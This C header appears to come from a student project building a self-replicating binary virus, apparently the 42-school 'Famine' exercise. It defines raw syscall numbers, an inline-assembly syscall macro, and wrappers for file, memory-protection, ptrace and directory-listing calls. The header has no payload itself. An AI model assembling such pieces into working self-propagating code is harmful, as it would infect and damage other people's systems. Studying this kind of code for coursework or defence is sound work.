/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   syscall.h                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 22:36:02 by jfortin           #+#    #+#             */
/*   Updated: 2019/06/06 01:03:55 by jfortin          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef SYSCALL_PRIVATE
# define SYSCALL_PRIVATE

#include <linux/unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/ptrace.h>

# define SYS_READ       0
# define SYS_WRITE      1
# define SYS_OPEN       2
# define SYS_CLOSE      3
# define SYS_FSTAT      5
# define SYS_MMAP       9
# define SYS_MPROTEC    10
# define SYS_MUNMAP     11
# define SYS_PTRACE     101
# define SYS_GETDENTS64 217
# define SYS_OPENAT     257

# define wrap_syscall(x) wrapper_syscall(x)

# define wrapper_syscall(x) asm volatile (".intel_syntax;\n"    \
                                        "  mov r10, rcx\n"      \
                                        "  mov rax, " #x "\n"   \
                                        "  syscall\n"           \
                                	"  leave\n"             \
                                	"  ret\n");

ssize_t	famine_read(int fd, void *buf, size_t count);
ssize_t	famine_write(int fd, const void *buf, size_t count);
int	famine_open(const char *pathname, int flags, ...);
int	famine_close(int fd);
int	famine_fstat(int fd, struct stat *statbuf);
void	*famine_mmap(void *addr, size_t length, int prot, int flags, int fd, \
		off_t offset);
int	famine_mprotect(void *addr, size_t len, int prot);
int	famine_munmap(void *addr, size_t length);
long	famine_ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
int	famine_getdents64(unsigned int fd, struct dirent *dirp, unsigned int count);
int	famine_openat(int dirfd, const char *pathname, int flags, mode_t mode);

#endif
